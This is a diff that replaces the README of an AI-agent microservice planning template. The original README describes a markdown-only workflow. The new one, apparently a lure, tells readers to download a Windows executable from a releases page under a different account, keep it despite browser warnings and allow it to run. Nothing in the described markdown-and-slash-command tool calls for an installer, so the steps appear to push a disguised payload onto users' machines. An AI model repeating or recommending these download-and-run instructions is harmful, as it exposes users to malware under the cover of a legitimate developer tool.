@@ -1,343 +1,166 @@
-# Agent Architect
+# 🤖 agent-architect - Build microservices with clear steps
 
-A template repository for building multi-microservice systems using AI coding tools as your development team.
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Lluis5713/agent-architect/releases)
 
-**No custom tooling. No learning curve. Just folders, markdown, and your AI coding tool.**
+## 🧭 What this app does
 
-**Works with:** Claude Code | GitHub Copilot (agent mode) | Any AI tool that reads markdown
+agent-architect helps you plan and build multi-microservice systems with a clear, step-by-step flow. It uses simple markdown files and slash commands to move from idea to working setup.
 
-> **New here?** Read **[HOW-TO-USE.md](HOW-TO-USE.md)** for the complete step-by-step guide.
+Use it to:
+- map out a system before you build it
+- define service contracts in plain text
+- keep each service aligned with the plan
+- validate the result before you move on
 
-## Quick Start
+This tool fits teams and solo users who want a structured way to build software with Claude Code and GitHub Copilot.
 
-### 1. Create your project from this template
+## 📥 Download and install
 
-```bash
-# Use GitHub template (recommended)
-gh repo create my-project-plan --template your-org/agent-architect --private
-cd my-project-plan
-```
+1. Open the release page: https://github.com/Lluis5713/agent-architect/releases
+2. Find the latest release
+3. Download the Windows file from that release
+4. Open the file after it finishes downloading
+5. Follow the on-screen steps to set it up
 
-### 2. One-time setup for Agent Teams
+If your browser asks for permission, choose to keep the file. If Windows shows a prompt, choose to run it.
 
-Add this to `~/.claude/settings.json`:
-```json
-{
-  "env": {
-    "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS": "1"
-  }
-}
-```
+## 🪟 Windows setup
 
-### 3. Run the interactive setup
+Before you start, make sure you have:
+- a Windows 10 or Windows 11 PC
+- an internet connection
+- enough free space for the app and related files
+- access to your browser and file downloads
 
-```bash
-claude                  # Open Claude Code in this directory
-/project:0-setup        # Agent interviews you and populates everything
-```
+After download:
+1. Open your Downloads folder
+2. Double-click the downloaded file
+3. Allow Windows to run it
+4. Wait for the setup to finish
+5. Start the app from the shortcut or the folder it creates
 
-The setup agent asks about your project one topic at a time:
-- Project name, description, business domain
-- Tech stack (language, framework, database, testing)
-- Business context (what you're building, for whom, core workflows)
-- Services (name, type, existing repo, dependencies)
-- Quality gates (review requirements, coverage thresholds)
+If the app uses a folder-based setup, keep the files in one place and do not rename them.
 
-Every answer is **saved immediately** to the right file. If interrupted, re-run and it picks up where you left off.
+## 🛠️ First run
 
-### 4. (Optional) Add reference materials
+When you open agent-architect for the first time:
+1. Choose a workspace folder for your project
+2. Add your idea or product goal
+3. Start with a plan step
+4. Move to spec files for each service
+5. Create contracts between services
+6. Build each part in order
+7. Run validation before you change the next step
 
-```bash
-cp ~/Downloads/requirements.pdf context/references/requirements/
-cp ~/Downloads/api-spec.yaml context/references/existing-apis/
-cp ~/Downloads/wireframes.png context/references/designs/
-```
+This keeps the work organized and easy to follow.
 
-### 5. Choose your mode and go
+## 🧩 How the workflow works
 
-#### Option A: Sequential Mode (1–2 services)
+agent-architect follows this path:
 
-Run phases manually, one at a time:
+- Plan: define the system and the parts it needs
+- Spec: write clear service details
+- Contract: set the rules between services
+- Build: create the services
+- Validate: check that everything still fits together
 
-```bash
-/project:1-discover            # Agent analyzes everything, asks clarifying questions
-/project:2-architect           # Agent designs system + test strategy ADR
-/project:3-specify             # Agent writes SPEC.md + TEST-PLAN.md per service
-/project:4-contract            # Agent generates API contracts + integration test plan
+Each step uses simple files, so you can review the work without special tools.
 
-# Review and approve specs, test plans, and contracts before building
+## 📁 What you will see
 
-/project:5-build order-service # Build one service at a time
-/project:6-validate            # Verify services work together
-/project:7-review              # Security, quality, and test completeness review
-```
+A typical project built with agent-architect may include:
 
-#### Option B: Team Mode (3+ services, recommended)
+- a main project plan
+- service specs
+- API contract files
+- build notes
+- validation checks
+- markdown instructions for Claude Code and GitHub Copilot
 
-One command — agents handle Phases 1–7 automatically:
-
-```bash
-/project:team-start
-```
-
----
+This structure helps you keep the project stable as it grows.
 
-## How Team Mode Works
-
-Running `/project:team-start` spawns **5 specialized agents** that orchestrate all remaining phases:
-
-| Agent | Model | Role |
-|-------|-------|------|
-| **Team Lead / PO** (your session) | opus | Orchestrates, enforces gates, relays your decisions |
-| **Sr. Solutions Architect** | opus | Discovery, architecture, contracts, cross-service review |
-| **Sr. Lead Engineer** | opus | Specs, test plans, builds services |
-| **Sr. QA & Security** | sonnet | Test plan augmentation, validation, security review |
-| **Sr. DevOps** | sonnet | Dockerfiles, CI/CD, docker-compose, deployment review |
-
-### What the agents do
-
-```
-Phase 1  Architect discovers alone, surfaces blocking questions for you
-Phase 2  Architect designs → 3 reviewers challenge in parallel → you approve
-Phase 3  Engineer writes specs per service (parallel) → QA augments each → you approve
-Phase 4  Architect generates contracts → Engineer reviews → you approve
-Phase 5  Layer 0 services build in parallel + DevOps builds infra + QA builds test harness
-         Layer 1+ services start as their dependencies complete
-Phase 6  QA leads cross-service validation + DevOps support
-Phase 7  4 parallel reviews (security, architecture, code quality, infra) → final report
-```
-
-Agents **challenge each other** — architect vs engineer on feasibility, QA vs engineer on testability, DevOps vs architect on deployability.
-
-### What you do
-
-Between gates, agents work autonomously. You intervene at **4 quality gates**:
-
-| Gate | When | What You Review |
-|------|------|-----------------|
-| **Spec review** | After Phase 3 | `services/*/specs/SPEC.md` — API designs, business rules |
-| **Test plan review** | After Phase 3 | `services/*/specs/TEST-PLAN.md` — test case thoroughness |
-| **Contract review** | After Phase 4 | `contracts/CONTRACT-MATRIX.md` — cross-service consistency |
-| **Production readiness** | After Phase 7 | `phases/7-review.md` — per-service scorecards |
-
-You'll also answer the architect's **blocking questions** after Phase 1 discovery.
-
-### Check progress anytime
-
-```bash
-/project:status            # Phase progress and service states
-/project:team-status       # Enhanced: agent assignments, test coverage, gate status
-```
-
----
-
-## Sequential vs Team Mode
-
-| | Sequential | Team |
-|---|---|---|
-| **How it runs** | You trigger each `/project:N` command | Agents auto-orchestrate Phases 1–7 |
-| **Parallelism** | Manual (multiple terminals) | Built-in (services build in dependency layers) |
-| **Cross-checking** | Single agent per phase | Agents challenge each other's work |
-| **Review depth** | 1 review perspective | 4 parallel review perspectives |
-| **You intervene** | Between every phase | Only at quality gates |
-| **Best for** | 1–2 services | 3+ services |
-
-Transition is non-destructive — `/project:team-start` detects existing progress and picks up from the next incomplete phase.
-
----
-
-## Phase Workflow
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  Phase 0: /project:0-setup        → Interactive project setup    │
-│           Agent interviews you, populates manifest + standards   │
-│           + PROJECT.md + service folders. No blank forms.        │
-├─────────────────────────────────────────────────────────────────┤
-│  Phase 1: /project:1-discover     → Gap analysis & questions    │
-│  Phase 2: /project:2-architect    → System design & ADRs        │
-│  Phase 3: /project:3-specify      → Specs + test plans / service│
-│  Phase 4: /project:4-contract     → API contracts + integration │
-│                                      test plan                   │
-│               HUMAN REVIEW GATE                                  │
-│                                                                  │
-│  Phase 5: /project:5-build        → Build with test traceability│
-│  Phase 6: /project:6-validate     → Cross-service validation    │
-│  Phase 7: /project:7-review       → Security, quality & test    │
-│                                      completeness review         │
-├─────────────────────────────────────────────────────────────────┤
-│  TICKET-DRIVEN (Jira integration):                               │
-│  /project:feature GS-123          → Jira ticket → context →     │
-│                                      phases → track everywhere   │
-│  /project:bugfix GS-456           → Bug ticket → diagnose →     │
-│                                      fix → regression test → PR  │
-├─────────────────────────────────────────────────────────────────┤
-│  TEAM MODE (optional):                                           │
-│  /project:team-start              → Spawn 5-agent team that      │
-│                                      auto-orchestrates Phases 1-7│
-└─────────────────────────────────────────────────────────────────┘
-```
-
-## Directory Structure
-
-```
-.
-├── manifest.yaml              # Single source of truth (services, stack, quality gates)
-├── manifest.local.yaml        # Machine-specific paths (gitignored, per developer)
-├── CLAUDE.md                  # Agent instructions
-│
-├── context/                   # Human-maintained inputs
-│   ├── PROJECT.md             #    Business overview
-│   ├── references/            #    Supporting documents (PRDs, wireframes, API specs)
-│   └── decisions/             #    Architecture Decision Records
-│
-├── services/                  # Per-service context & specs
-│   ├── .template/             #    Template for new services
-│   └── {service-name}/
-│       ├── CONTEXT.md         #    Human-written service context
-│       ├── references/        #    Service-specific references
-│       └── specs/
-│           ├── SPEC.md        #    Generated by spec agent (Phase 3)
-│           ├── TEST-PLAN.md   #    Test cases with traceability (Phase 3)
-│           ├── BUILD-REPORT.md#    Build results (Phase 5)
-│           └── TEST-REPORT.md #    Test execution results (Phase 5)
-│
-├── contracts/                 # Cross-service interfaces
-│   ├── api/                   #    OpenAPI specs (service-to-service)
-│   ├── events/                #    Event JSON schemas
-│   ├── shared-models/         #    Shared data types
-│   ├── CONTRACT-MATRIX.md     #    Interface overview
-│   └── INTEGRATION-TEST-PLAN.md   Cross-service test scenarios (Phase 4)
-│
-├── standards/                 # Engineering standards
-│   ├── backend-system-design-standard.md   Backend Java/Spring Boot standard
-│   ├── coding-standards.md                 Backend + frontend conventions
-│   ├── api-design.md                       REST conventions, response envelope
-│   ├── testing-standards.md                Test pyramid, edge cases, templates
-│   └── ui-architecture.md                  Next.js/React/MUI frontend standard
-│
-├── phases/                    # Phase completion tracking
-│
-├── .claude/commands/project/  # Claude Code slash commands (/project:*)
-│
-├── .github/prompts/project/   # Copilot prompt files (synced from commands)
-│
-└── scripts/
-    └── sync-prompts.sh        # Sync Claude commands → Copilot prompts
-```
-
-## Key Concepts
-
-### manifest.yaml drives everything
-Every agent reads the manifest first. Change the tech stack, agents generate different code. Change build_targets, agents focus on different services. Change a service status to `skip`, agents ignore it.
-
-### Specs + test plans are the quality gate
-The most important outputs are `services/*/specs/SPEC.md` and `TEST-PLAN.md`. A good spec produces good code. A good test plan catches bugs before they ship. Every test in code traces back to a test case ID (`// Covers: TC-ORD-ACC-001`), which traces back to a SPEC.md section.
-
-### Contracts prevent integration failures
-Cross-service API contracts in `contracts/` are shared truth. Both provider and consumer reference the same file. `INTEGRATION-TEST-PLAN.md` defines cross-service test scenarios, failure cascades, and eventual consistency verification.
-
-### Phases are checkpoints, not walls
-You can re-run any phase. Updated the requirements? Re-run discover + architect + specify. Found a bug in the spec? Fix it, then rebuild-service. The framework is iterative.
-
-## Advanced Usage
-
-### Building services in parallel (sequential mode)
-```bash
-# Run multiple Claude Code sessions (one per service)
-# Terminal 1:
-claude -p "/project:5-build order-service"
-# Terminal 2:
-claude -p "/project:5-build payment-service"
-```
-
-### Upgrading from sequential to team mode
-```bash
-/project:team-migrate      # Detects progress, upgrades to v2.0
-/project:team-start        # Resumes from next incomplete phase
-```
-
-### Using with GitHub Copilot
-
-The framework works with Copilot out of the box:
-
-```bash
-# Copilot reads .github/copilot-instructions.md (synced from CLAUDE.md)
-# Copilot prompt files live in .github/prompts/project/*.prompt.md
-
-# In VS Code Copilot Chat (agent mode), type / to see available prompts
-
-# After editing any .claude/commands/project/*.md, sync to Copilot:
-./scripts/sync-prompts.sh
-```
-
-### Working from a Jira ticket
-```bash
-/project:feature GS-123       # Reads ticket, determines services, runs phases
-/project:bugfix GS-456        # Reads bug, diagnoses, fixes, creates PR
-```
-The agent reads the Jira ticket via Atlassian MCP, determines which services are affected, updates context, and drives the appropriate phases. The Jira key is tracked in branch names, commits, specs, test case IDs, and PRs. If Atlassian MCP isn't available, you can paste ticket details manually.
-
-### Enriching existing services
-1. Set service status to `enrich` in manifest
-2. Put the existing API spec in `services/<name>/references/`
-3. Describe what needs to change in `services/<name>/CONTEXT.md`
-4. Run phases 3-7 — specs will focus only on changes
-
-## All Commands
-
-### Phase Commands
-```
-/project:0-setup                    Interactive project setup (run first!)
-/project:1-discover                 Discovery & gap analysis
-/project:2-architect                Architecture & ADRs
-/project:3-specify                  Specs + test plans (all services)
-/project:3-specify order-service    Spec + test plan (one service)
-/project:4-contract                 Contracts + integration test plan
-/project:5-build order-service      Build with test traceability
-/project:6-validate                 Cross-service validation
-/project:7-review                   Quality + test completeness review
-/project:retrospective              Post-iteration self-improvement
-```
-
-### Ticket-Driven Commands (Jira Integration)
-```
-/project:feature GS-123             Read Jira ticket, update context, run phases, track everywhere
-/project:feature GS-123 --team      Same + spawn agent team for multi-service features
-/project:bugfix GS-456              Read bug ticket, diagnose, fix, regression test, PR
-```
-
-### Utility Commands
-```
-/project:status                     Progress dashboard
-/project:add-service <name> <type>  Scaffold a new service folder
-/project:rebuild-service <name>     Rebuild after changes
-/project:retrospective              Post-iteration self-improvement
-```
-
-### Team Commands
-```
-/project:team-start                 Spawn 5-agent team, auto-orchestrate
-/project:team-migrate               Upgrade v1 repo to v2.0
-/project:team-status                Enhanced status with agents & tests
-```
-
-## FAQ
-
-**Q: Where does the actual code live?**
-A: Each service has a `local_path` in `manifest.yaml` pointing to its code directory. This can be anywhere — a sibling folder, an existing repo, a monorepo path. The builder agent asks for the path on first build and saves it. This planning repo only holds context, specs, and contracts — never code.
-
-**Q: Can I skip phases?**
-A: Phases 1-4 build on each other. You can skip 6-7 but they catch real issues. Phase 5 requires phase 3 (specs); phase 4 (contracts) is recommended for services with cross-service dependencies.
-
-**Q: How do I handle changing requirements?**
-A: Update `context/PROJECT.md` or the service's `CONTEXT.md`, then re-run from the phase that's affected. Specs are regenerated, builders can rebuild.
-
-**Q: What if I have 10+ services?**
-A: Use `build_targets` in manifest.yaml to focus on 2-3 at a time. The framework handles any number of services but building is most effective in small batches.
-
-**Q: Can multiple developers work on this simultaneously?**
-A: Yes. The planning repo is shared (manifest.yaml, specs, contracts). Machine-specific paths live in `manifest.local.yaml` (gitignored). Each developer creates their own from `manifest.local.yaml.example`.
-
-**Q: How does the approval process work?**
-A: Quality gates in `manifest.yaml` define what needs approval. The Team Lead pauses at each gate and presents work for your review. Approvals are recorded in the manifest under `approvals:` with who approved, when, and any notes.
+## 🔧 Main use cases
+
+Use agent-architect when you want to:
+- split a large app into smaller services
+- keep service boundaries clear
+- work from a written spec
+- reduce guesswork during development
+- keep AI coding tools on the same path
+- review changes with simple text files
+
+It works well for REST APIs, service orchestration, and teams that want a repeatable process.
+
+## 👀 What you need
+
+For best results, use:
+- Windows 10 or Windows 11
+- a modern browser
+- Claude Code or GitHub Copilot access
+- a text editor
+- a folder where you can store project files
+
+No complex setup is needed to start using the release from the download page.
+
+## 🧠 Tips for smooth use
+
+- Keep one project per folder
+- Use clear names for services
+- Write short specs with one task per file
+- Review contract files before you build
+- Validate after each change
+- Save backups before large edits
+
+These habits make it easier to track what changed and why.
+
+## 📝 Example project flow
+
+A simple microservice project might look like this:
+1. You write a plan for an order system
+2. You split it into order, payment, and user services
+3. You define the API contract for each service
+4. You build one service at a time
+5. You check that requests and responses still match
+6. You validate the full system before release
+
+This keeps the work clear from start to finish.
+
+## 🔍 Topics covered
+
+This project connects with:
+- AI agents
+- AI coding
+- API contracts
+- code generation
+- developer tools
+- GitHub Copilot
+- LLM workflows
+- microservices
+- multi-agent systems
+- NestJS
+- orchestration
+- productivity
+- REST APIs
+- software architecture
+- spec-driven development
+- TypeScript
+
+## 📌 File-based approach
+
+agent-architect avoids custom tooling and keeps the process in markdown and slash commands. That makes it easier to:
+- read the project state
+- share work with others
+- edit with a normal text editor
+- keep the process visible
+- reuse the same structure in later projects
+
+## ✅ Best results
+
+Use the app in this order:
+- plan first
+- write the spec
+- define the contract
+- build the service
+- validate the result
+
+If you keep that order, each step stays easier to manage and the project stays clearer for anyone who joins later.
